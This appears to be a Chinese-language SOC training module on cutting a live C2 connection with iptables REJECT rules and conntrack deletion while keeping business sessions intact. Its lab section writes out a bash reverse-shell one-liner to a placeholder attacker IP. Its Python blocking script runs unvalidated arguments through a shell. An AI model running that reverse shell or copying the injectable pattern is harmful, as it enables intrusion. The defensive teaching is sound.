# 02.1 邊界防火牆策略與微創阻斷實務 (Border Firewall Policies & Surgical Blocking)

## 🚨 案發現場破題 (Incident Scenario & Mental Workflow)

週二下午 15:40，企業 SOC 告警監控螢幕瞬間被大量紅字刷屏：「`CRITICAL: Suspicious Egress Traffic to Known Cobalt Strike C2 IP 198.51.100.23:443 from Core Financial Database Server (10.10.20.5)`」。

一線分析師驚呼：「資料庫伺服器正在連外！馬上全網拔線！」
然而，那台伺服器是支撐全台數十萬用戶實時交易的核心資料庫。如果分析師草率在邊界防火牆下達 `iptables -P FORWARD DROP` 或直接切斷該網段，每中斷 1 分鐘，企業將承擔數百萬元的商業索賠與金管會重大資安通報處罰！

反之，如果不立即處置，核心資料庫內的敏感身分證號與信用卡資料將在數分鐘內被黑客打包帶走。

這就是資安藍軍面對的經典極限場景：**「在不中斷合法業務連續性的前提下，實施外科手術式的精準微創阻斷（Surgical Blocking）」**！
分析師不能靠拍腦袋或粗暴斷網，而是必須深入操作系統核心網路堆疊——**Linux Netfilter 表鏈架構與 `conntrack` 連線狀態追蹤機制**，在 TCP 連線層級將惡意連線瞬間斬斷，同時保障原有合法業務會話毫髮無傷。

邊界防禦工程師標準作戰心智模型：
1. **連線狀態解剖（Conntrack State Inspection）**：清楚區分 `NEW`、`ESTABLISHED`、`RELATED`、`INVALID`。惡意連線是已建立的連線還是正在嘗試握手？
2. **阻斷手段維度權衡（DROP vs REJECT vs Conntrack Destroy）**：
   - 單純在防火牆下達 `iptables -I FORWARD -d C2_IP -j DROP`，只能阻止「後續封包」，已經處於 `ESTABLISHED` 狀態的連線可能仍滯留在記憶體中緩慢傳輸！
   - 必須配合 `conntrack -D` 工具，直接從 Linux 核心狀態雜湊表中強制抹除（Destroy）該條連線！
   - 同時向內網發起端回送 TCP RST（`REJECT --reject-with tcp-reset`），強迫本地異常程序立刻拋錯中斷，防止其持續佔用系統 CPU 與 Socket 資源。
3. **影響面評估與白名單保護（Blast Radius & Critical Service Whitelisting）**：在下達任何阻斷前，必須確認該阻斷策略是否會誤傷企業核心 DNS（UDP 53）、NTP（UDP 123）或上游合規 API 閘道器。
4. **持久化策略固化（Policy Hardening & Persistence）**：臨時阻斷策略如何沉澱至正式的防火牆設定檔，防止伺服器重開機後規則失效導致黑客死灰復燃。

## 🧩 第一動：底層機制/協定解剖 (Mechanics & Physical Structs)

### 1. Linux Netfilter 表鏈結構與封包物理流向

Netfilter 是 Linux 核心內部的一組鈎子（Hooks），掌握封包穿越核心的先後順序是撰寫精準規則的前提：

```text
封包進入網卡 (Ingress)
       │
       ▼
 [PREROUTING 鏈] ──► 依序通過: raw表 ➔ conntrack狀態追蹤 ➔ mangle表 ➔ nat表(DNAT)
       │
   路由決策 (Routing Decision)
   ├──► 目的為本機 ──► [INPUT 鏈] (mangle ➔ filter ➔ nat) ──► 本機應用程式
   │                                                             │
   │                                                             ▼
   │                                                       本機程序發送 (Local)
   │                                                             │
   │                                                             ▼
   │       路由決策 ◄── [OUTPUT 鏈] (raw ➔ conntrack ➔ mangle ➔ nat ➔ filter)
   │          │
   └──► 目的非本機 ──► [FORWARD 鏈] (mangle ➔ filter)
                              │
                              ▼
                       [POSTROUTING 鏈] (mangle ➔ nat: SNAT/MASQUERADE)
                              │
                              ▼
                       離開網卡發送 (Egress)
```

- **Filter 表**：專注於封包的放行與阻斷（`ACCEPT`, `DROP`, `REJECT`），是微創阻斷的主戰場。
- **FORWARD 鏈**：所有穿越防火牆（從內網流向外網、或跨網段）的流量必經此鏈。
- **Conntrack 模組**：在 PREROUTING 階段即對封包進行狀態標記，維護雙向會話的生命週期。

### 2. Conntrack 連線狀態機與核心結構解剖

Linux 核心的 `nf_conntrack` 子系統將每一個穿越防火牆的傳輸層連線抽象為一個 tuple（五元組）雙向雜湊節點：

```c
/* Linux 核心 nf_conntrack 核心雙向元組結構 */
struct nf_conntrack_tuple {
    struct {
        union nf_inet_addr u3; /* 來源 IP (IPv4 / IPv6) */
        union {
            __be16 all;
            struct { __be16 port; } tcp; /* 來源 Port */
        } u;
    } src;

    struct {
        union nf_inet_addr u3; /* 目的 IP */
        union {
            __be16 all;
            struct { __be16 port; } tcp; /* 目的 Port */
        } u;
        u_int8_t protonum;     /* 協定代碼 (IPPROTO_TCP=6, IPPROTO_UDP=17) */
    } dst;
};
```

#### 四大狀態物理意涵：
1. **`NEW`**：客戶端發起連線的第一個封包（如 TCP 帶有 `SYN` 標記）。
2. **`ESTABLISHED`**：TCP 雙向三向交握完成（收到 `SYN-ACK` 及後續 `ACK`），進入資料傳輸態。
3. **`RELATED`**：由現存合法連線衍生的關聯連線（如 FTP 透過 Control 埠協商出 Data 傳輸 Port 20、或 ICMP 錯誤封包）。
4. **`INVALID`**：不符合狀態機邏輯的畸形封包（如未交握即送出 `FIN/PSH`，或序列號完全錯亂）。

### 3. 微創阻斷的三大核心武器對比：DROP vs REJECT vs Conntrack Flush

| 處置動作 | 底層物理行為 | 客戶端/攻擊者體感 | 藍軍推薦使用場景 |
| :--- | :--- | :--- | :--- |
| **`DROP`** | 核心直接銷毀封包，不回覆任何訊號 | 客戶端連線逾時（Timeout 掛起乾等 60~120 秒） | 阻斷外網自動化端口掃描、DDoS 攻擊。迫使黑客攻擊程序阻塞卡死。 |
| **`REJECT`** | 核心丟棄封包，並**主動回傳 TCP RST 或 ICMP Port Unreachable** | 客戶端立即收到 `Connection reset by peer`，程式瞬間崩潰中斷 | **微創阻斷內網受害主機連外 C2**！強迫惡意程序或木馬連線即刻拋錯中斷，避免內部主機耗盡 Socket 與重試資源。 |
| **`Conntrack -D`** | 直接從核心記憶體雜湊表中抹除該五元組狀態節點 | 該連線瞬間失去 `ESTABLISHED` 標籤，後續所有封包立即退化為未追蹤狀態 | **消滅既有已連線的長會話（如已建立的 Reverse Shell、C2 信標）**！單下 iptables 規則無法立即切斷已握手會話，必搭配此招！ |

## 💻 第三動：現場追兇——作戰指令與腳本庫

### 1. Linux Netfilter 微創阻斷與 Conntrack 現場處置命令庫

```bash
# 1. 檢視當前核心所有正在連向外部可疑 C2 IP 的連線狀態 (抓取 Tuple)
conntrack -L -d 198.51.100.23

# 2. 【核心第一動】在 FORWARD 鏈頂端插入精準微創阻斷 (Surgical REJECT)
# 說明：針對特定來源與特定外部 C2 IP 回傳 RST，迫使惡意行程瞬間終止
iptables -I FORWARD 1 -s 10.10.20.5 -d 198.51.100.23 -p tcp -j REJECT --reject-with tcp-reset

# 3. 【核心第二動】強制抹除核心 Conntrack 記憶體中的現存連線 (斬斷已建立的 Shell)
conntrack -D -p tcp -s 10.10.20.5 -d 198.51.100.23

# 4. 驗證連線是否已徹底蒸發 (輸出應為 0 flow)
conntrack -L -d 198.51.100.23

# 5. 檢視 iptables 規則命中計數器 (確認封包被命中攔截)
iptables -L FORWARD -v -n --line-numbers | grep "198.51.100.23"
```

### 2. 生產級安全邊界防火牆黃金基準模板 (`/etc/iptables/rules.v4`)

```bash
# 1. 預設策略：全域預設阻斷 (Default Drop)
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# 2. 核心第一條：極速放行合法現存與關聯連線 (提升吞吐效能)
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# 3. 核心第二條：無條件丟棄非法無效狀態封包 (防畸形掃描)
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
iptables -A FORWARD -m conntrack --ctstate INVALID -j DROP

# 4. 本機迴路放行 (Loopback)
iptables -A INPUT -i lo -j ACCEPT

# 5. 微隔離原則：僅允許 DMZ Web 主機存取內部資料庫特定 Port
iptables -A FORWARD -s 172.16.10.100 -d 10.10.20.5 -p tcp --dport 3306 -m conntrack --ctstate NEW -j ACCEPT

# 6. 微隔離保護：嚴禁資料庫伺服器主動發起對外外聯 (Zero Trust Egress)
iptables -A FORWARD -s 10.10.20.0/24 -m conntrack --ctstate NEW -j LOG --log-prefix "[ILLEGAL-EGRESS-DB]: "
iptables -A FORWARD -s 10.10.20.0/24 -m conntrack --ctstate NEW -j REJECT --reject-with tcp-reset
```

### 3. 自動化微創阻斷與會話剿滅腳本 (Python Surgical Terminator)

```python
#!/usr/bin/env python3
# 藍隊專用：全自動微創阻斷工具，一鍵執行「iptables 插入 + Conntrack 抹除 + 驗證」

import subprocess
import sys
import re

def execute_cmd(cmd):
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result.returncode, result.stdout.strip(), result.stderr.strip()

def surgical_block(src_ip, dst_ip, port=None):
    print(f"[*] INITIATING SURGICAL TERMINATION: {src_ip} -> {dst_ip}")
    
    # 1. 檢查目前 conntrack 是否有存活連線
    check_cmd = f"conntrack -L -s {src_ip} -d {dst_ip}"
    code, out, _ = execute_cmd(check_cmd)
    if out:
        print(f"[!] Active sessions found in kernel conntrack:\n{out}")
    else:
        print("[-] No active conntrack session currently established.")

    # 2. 在 FORWARD 鏈第 1 位插入 REJECT 規則
    port_clause = f"-p tcp --dport {port}" if port else "-p tcp"
    rule = f"iptables -I FORWARD 1 -s {src_ip} -d {dst_ip} {port_clause} -j REJECT --reject-with tcp-reset"
    print(f"[*] Injecting Kernel Rule: {rule}")
    code, _, err = execute_cmd(rule)
    if code != 0:
        print(f"[-] Failed to inject iptables rule: {err}")
        return False

    # 3. 銷毀核心 conntrack 既有狀態表項
    flush_cmd = f"conntrack -D -p tcp -s {src_ip} -d {dst_ip}"
    print(f"[*] Nuking Kernel Conntrack Entries: {flush_cmd}")
    code, out, err = execute_cmd(flush_cmd)
    print(f"[+] Conntrack purge result: {out} {err}")

    # 4. 驗證連線狀態
    _, verify_out, _ = execute_cmd(check_cmd)
    if not verify_out:
        print(f"[🎯 SUCCESS] Session {src_ip} -> {dst_ip} surgically terminated with 0 business collateral damage!")
        return True
    else:
        print("[!] Warning: Some conntrack flows might still linger, verify manually.")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 surgical_block.py <SRC_IP> <DST_IP> [PORT]")
        sys.exit(1)
    
    src = sys.argv[1]
    dst = sys.argv[2]
    p = sys.argv[3] if len(sys.argv) > 3 else None
    surgical_block(src, dst, p)
```

## ⚖️ 第四動：研判分水嶺——真實威脅 vs 業務誤報

### SOC 研判核心問題表

| 核心提問（研判維度） | 本技術點實戰檢核標準 |
| :--- | :--- |
| **Q1：被告警的外聯目的 IP 是否屬於合法的公有雲基礎設施或官方 CDN？** | 檢驗目的端資產屬性：目的 IP 是否屬於微軟更新伺服器（Windows Update）、AWS S3 官方端點、或 CDN 節點？需防止將正常的系統升級或雲端儲存誤判為 C2 流量。 |
| **Q2：發起該外聯的內部主機其網路安全防護層級與角色為何？** | 資產分區敏感度：若發起端為「員工辦公上網區（OA）」，偶發異常連線可能為人為誤點；若發起端為「內部封閉資料庫區（DB Zone）」，**任何未報備的外聯即刻視為最危急 P1 入侵**！ |
| **Q3：此連線通訊埠是否為該主機核准的合規業務服務協定？** | 埠口與協定吻合度：該主機對外連線使用的是標準 HTTPS 443，還是非典型高位埠（如 4444, 8888, 1337）？非標準埠口連線高達 95% 為惡意反彈木馬。 |
| **Q4：在防火牆日誌中，該連線的傳輸量（Bytes Out）與持續時間為何？** | 流量特徵鑑識：若是幾百 Bytes 的週期性連線，偏向 C2 心跳信標（Beaconing）；若在短時間內持續傳輸數百 MB 且單向輸出，代表資料正在被大規模竊取外發（Data Exfiltration）。 |
| **Q5：此阻斷策略是否會衝擊生產環境同網段的其他合法服務？** | 爆炸半徑評估（Blast Radius）：阻斷策略是否偷懶使用了掩碼 `/16` 或 `/24`？微創原則要求阻斷條件**嚴格限定到單一 `/32` 主機 IP 與特定目標 IP**，禁止隨意波及整個網段。 |
| **Q6：主機發起外聯前，本地端點是否有未知處理程序或腳本的建立？** | 結合 EDR 遙測佐證：檢查連線時間點該主機的 Sysmon Event ID 1（Process Create）或 Event ID 3（Network Connect），確認發起連線的具體執行檔名與命令行參數。 |

## 🛡️ 第五動：處置圍堵與系統加固 SOP

### 1. 突發重大資料外洩之緊急微創處置流程

當確認核心主機正處於資料外洩或 C2 互動式 Shell 連線中時，嚴格依照以下黃金處置 SOP：

```bash
# 步驟 1：鎖定目標五元組，一秒插入微創阻斷 (指定來源、目的與 Protocol)
iptables -I FORWARD 1 -s 10.10.20.5 -d 198.51.100.23 -p tcp -j REJECT --reject-with tcp-reset

# 步驟 2：立即抹除核心已建立之連線狀態 (防止已存在的 TCP 會話繼續漏水)
conntrack -D -p tcp -s 10.10.20.5 -d 198.51.100.23

# 步驟 3：在受害主機本地提取該連線之進程 PID 並將其掛起 (SIGSTOP 保留記憶體)
SUSPICIOUS_PID=$(ss -tpn | grep "198.51.100.23" | awk -F'pid=' '{print $2}' | awk -F',' '{print $1}')
if [ -n "$SUSPICIOUS_PID" ]; then
    kill -STOP $SUSPICIOUS_PID
    echo "[+] Process $SUSPICIOUS_PID frozen for forensic dump."
fi

# 步驟 4：進行記憶體轉儲取證後，再行將其強制擊殺
# gcore -o /tmp/malware_dump.core $SUSPICIOUS_PID
# kill -9 $SUSPICIOUS_PID
```

### 2. 生產環境邊界防火牆持久化與基線加固

1. **規則持久化配置（Save & Restore）**：
   - 避免重開機遺失緊急規則：
     ```bash
     iptables-save > /etc/iptables/rules.v4
     # 或於 Ubuntu 安裝 iptables-persistent 服務自動開機載入
     netfilter-persistent save
     ```
2. **連線追蹤表雜湊上限調優（防 DDoS 衝垮防火牆）**：
   - 在大規模併發環境中，調大 Conntrack 記憶體上限：
     ```bash
     sysctl -w net.netfilter.nf_conntrack_max=2097152
     sysctl -w net.netfilter.nf_conntrack_tcp_timeout_established=1800
     ```
3. **落實預設出網阻斷架構（Zero Trust Egress Architecture）**：
   - 對所有敏感生產伺服器網段，預設將出網策略設為 `DROP`，僅對經過資安審查的白名單網域與 IP 開放最小必要通訊。

## 🎯 靶場實戰檢驗 (Hands-on Lab Walkthrough)

### 靶場環境說明
- **網路拓撲**：
  - 受害金融主機（`10.10.20.5`）
  - 邊界 Linux 閘道器（雙網卡：內網 `10.10.20.1`，外網 `192.168.56.10`，運行 iptables + conntrack）
  - 攻擊者 C2 伺服器（`198.51.100.23:4444`）
  - 正常業務伺服器（`10.10.30.8:3306`）
- **實戰任務**：在受害主機已建立一條通往 C2 的 Reverse Shell 的情況下，利用微創阻斷技術將黑客連線切斷，並同時驗證受害主機通往正常資料庫（Port 3306）的業務會話維持 100% 正常連線。

### 實戰驗證步驟

#### 步驟 1：在受害主機建立雙向連線（模擬真實環境）
```bash
# 1. 建立通往正常業務主機的連線 (保持背景運行)
nc -l -p 3306 &  # 模擬正常業務監聽
nc 10.10.30.8 3306 &

# 2. 建立通往黑客 C2 的 Reverse Shell
bash -i >& /dev/tcp/198.51.100.23/4444 0>&1 &
```

#### 步驟 2：在閘道器檢查核心連線追蹤表
```bash
conntrack -L -s 10.10.20.5
```
- **輸出確認**：
  `tcp 6 431999 ESTABLISHED src=10.10.20.5 dst=198.51.100.23 sport=54321 dport=4444 ...`
  `tcp 6 432000 ESTABLISHED src=10.10.20.5 dst=10.10.30.8 sport=54322 dport=3306 ...`
  確認兩條連線皆處於 `ESTABLISHED` 狀態！

#### 步驟 3：僅使用傳統 iptables DROP 進行測試（驗證其缺陷）
```bash
iptables -A FORWARD -s 10.10.20.5 -d 198.51.100.23 -j DROP
```
- **測試結果**：在黑客終端敲擊指令，**連線依然活著並能收到回顯**！因為前面有一條放行 `ESTABLISHED` 的規則將後續封包直接放行了。單純在尾部追加 `DROP` 完全無效！

#### 步驟 4：實施微創阻斷二刀流（REJECT + Conntrack Flush）
```bash
# 1. 在鏈首插入強效 REJECT
iptables -I FORWARD 1 -s 10.10.20.5 -d 198.51.100.23 -p tcp -j REJECT --reject-with tcp-reset

# 2. 核心會話一鍵抹除！
conntrack -D -p tcp -s 10.10.20.5 -d 198.51.100.23
```

#### 步驟 5：驗證阻斷與業務隔離效果
1. **黑客 C2 終端**：終端立即拋出 `Connection reset by peer`，反彈 Shell 瞬間斷開陣亡！
2. **正常業務終端**：受害主機連往 `10.10.30.8:3306` 的業務 Session **依然保持 ESTABLISHED 且封包正常收發**！
**實戰結論**：微創阻斷成功實現「精準擊殺惡意 C2，核心業務零傷亡」的最高防禦指標！

## 📋 過關驗收檢查點 (Mastery Checklist)

- [ ] **Q1：在 Linux Netfilter 架構中，為什麼在 FORWARD 鏈尾端追加一條 `iptables -A FORWARD -d C2_IP -j DROP` 無法立即中斷已經建立的黑客 Reverse Shell？**
  - *驗收標準*：答出因為生產環境防火牆通常在規則最頂端配置了放行已建立連線的規則（`-m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT`）。當連線已處於 ESTABLISHED 狀態時，後續封包在頂端就被直接匹配放行，根本無法到達鏈尾的 DROP 規則。
- [ ] **Q2：簡述 `conntrack -D` 命令在微創阻斷中的核心物理作用。如果只下了 iptables 阻斷規則卻沒執行此命令，會有何後果？**
  - *驗收標準*：答出 `conntrack -D` 會直接將指定的五元組連線從 Linux 核心狀態追蹤雜湊表中強制抹除。若未執行此命令，已握手的連線在核心中依然具備 ESTABLISHED 標籤，可能繼續維持連線或延遲數分鐘直到連線逾時，無法第一時間阻斷資料外洩。
- [ ] **Q3：在阻斷內部受害主機連外 C2 時，為什麼推薦使用 `REJECT --reject-with tcp-reset` 而非靜默的 `DROP`？**
  - *驗收標準*：答出 `DROP` 會讓連線無聲掛起，客戶端惡意行程會持續處於等待與重試狀態，消耗主機 Socket 與資源；而 `REJECT` 主動向發起端回送 TCP RST 封包，能強迫本機作業系統與惡意程序立即拋出連線重置錯誤並終止會話，加速威脅中斷。
- [ ] **Q4：說明 Netfilter 連線追蹤中 `RELATED` 狀態的定義，並舉出一個合規業務協定依賴此狀態的典型範例。**
  - *驗收標準*：答出 `RELATED` 是指由一個已經處於 ESTABLISHED 的合法主連線所觸發、協商出的全新關聯連線。典型範例為傳統 FTP 協定（主連線控制埠 TCP 21 協商出動態資料傳輸埠 20），或傳輸中因網路錯誤產生的關聯 ICMP 錯誤回報封包。
- [ ] **Q5：什麼是「微創阻斷（Surgical Blocking）」中的爆炸半徑（Blast Radius）控制？在下達策略時應遵循哪三大約束原則？**
  - *驗收標準*：答出爆炸半徑控制是指防止防禦策略波及無辜的正常業務連線。三大原則包括：(1) 限制精確到單一主機（使用 `/32` 精確 IP 禁止整網段封鎖）；(2) 限制具體通訊協定與埠口（如限定 TCP 4444，不阻斷其他服務）；(3) 優先配置核心業務白名單（DNS/NTP/DB 放行保護）。
